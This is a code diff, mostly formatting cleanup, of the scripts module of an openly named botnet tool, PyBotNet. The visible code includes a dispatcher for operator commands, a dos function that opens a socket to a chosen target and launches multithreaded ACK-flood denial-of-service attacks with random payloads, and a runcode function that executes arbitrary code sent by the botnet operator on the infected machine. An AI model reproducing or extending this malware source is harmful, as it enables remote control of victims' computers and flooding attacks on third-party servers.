@@ -1,19 +1,19 @@
 '''Defult PyBotNet scripts'''
-import enum
+
 import re
 import os
 import subprocess
-import requests
 import threading
+import random
+import socket
+import webbrowser
+
 from typing import List
 from time import sleep
 from uuid import getnode as get_system_mac_addres
 from requests import get
-import sys
+
 from playsound import playsound
-import webbrowser
-import socket
-import random
 
 
 # pybotnet import
@@ -173,12 +173,12 @@ def execute_scripts(command: str, pybotnet_up_time: int,ADMIN_CHAT_ID: str,
 
             elif command_name == "openurl":
                 return openurl(logger, command)
-            
+
             elif command_name == "dos":
-                return dos(logger,command)
+                return dos(logger, command)
 
             elif command_name == "runcode":
-                return runcode(logger,command)
+                return runcode(logger, command)
         logger.error('execute_scripts invalid command; Wrong format')
         return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
 
@@ -544,7 +544,6 @@ def playsound_pybotnet(logger, command):
     return "Playsound Started."if threadObject.is_alive() else "PlaySound Failed."
 
 
-
 def openurl(logger, command):
     url = split_command(command)[1]
     times = split_command(command)[2]
@@ -559,7 +558,8 @@ def openurl(logger, command):
         logger.error("Error occurred.")
         return "Error occurred."
 
-def dos(logger,command):
+
+def dos(logger, command):
     splitted_command = split_command(command)
 
     dostype = splitted_command[1]
@@ -567,16 +567,15 @@ def dos(logger,command):
     port = splitted_command[3]
     thread_num = splitted_command[4]
     payload = splitted_command[5]
-    if all(var.isdigit for var in [port,thread_num,payload]):
+    if all(var.isdigit for var in [port, thread_num, payload]):
         pass
     else:
         logger.error("Data was not correct.")
         return "Data was not correct."
 
-
     try:
         logger.info(f"Checking IP {target} on port {port}")
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, int(port)))
         s.close()
     except:
@@ -585,7 +584,8 @@ def dos(logger,command):
 
     else:
         try:
-            payload = random._urandom(int(payload)) if dostype.lower() == "ackflood" else 1
+            payload = random._urandom(
+                int(payload)) if dostype.lower() == "ackflood" else 1
         except:
             logger.error("Payload too big. Aborting.")
             return "Payload too big , try smaller payloads."
@@ -593,7 +593,7 @@ def dos(logger,command):
             try:
                 logger.info("Starting Dos Attack...")
                 dos = util.dos(
-                    target,int(port),payload,dostype
+                    target, int(port), payload, dostype
                 )
                 for i in range(int(thread_num)):
                     thread = threading.Thread(target=dos.attack)
@@ -602,8 +602,8 @@ def dos(logger,command):
                 logger.error("Something Failed. Maybe The Servers Are Down !")
                 return "Something Failed. Maybe The Servers Are Down !"
 
-        
-def runcode(logger,command):
+
+def runcode(logger, command):
     code = ' '.join(split_command(command)[1:])
     logger.info(f"Trying to run {code}")
     try:
@@ -612,7 +612,6 @@ def runcode(logger,command):
     except Exception as error:
         logger.error(f"Something failed while trying to run code. {error}")
         return f"Something failed while trying to run code. {error}"
-
 
 
 def command_help(logger):
